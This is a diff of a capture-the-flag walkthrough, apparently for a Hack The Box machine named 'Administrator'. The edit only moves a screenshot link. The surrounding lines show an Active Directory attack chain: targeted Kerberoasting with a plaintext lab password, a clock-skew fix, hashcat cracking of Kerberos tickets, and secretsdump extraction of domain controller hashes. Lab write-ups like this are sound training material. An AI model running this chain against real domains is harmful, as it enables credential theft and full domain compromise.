@@ -36,7 +36,7 @@ john --wordlist=rock.txt backuphash
 ython3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 ```
 ### Error
-![[Screenshot from 2024-11-22 18-32-42.png]](assests/Screenshot from 2024-11-22 18-32-42.png)
+![Screenshot from 2024-11-22 18-32-42](https://github.com/user-attachments/assets/ab691126-ab35-4c6e-8f2a-56db2ef0d97a)
 ### Fix
 ```bash
 faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
@@ -46,7 +46,7 @@ faketime "$(ntpdate -q administrator.htb | cut -d ' ' -f 1,2)" python3 targetedK
 ```bash
 hashcat -m 13100 ethan.hash rock.txt
 ```
-![Screenshot from 2024-11-22 18-32-42](https://github.com/user-attachments/assets/ab691126-ab35-4c6e-8f2a-56db2ef0d97a)
+
 
 ```bash
 secretsdump.py -outputfile administartor_hashes -just-dc ethan@10.10.11.42
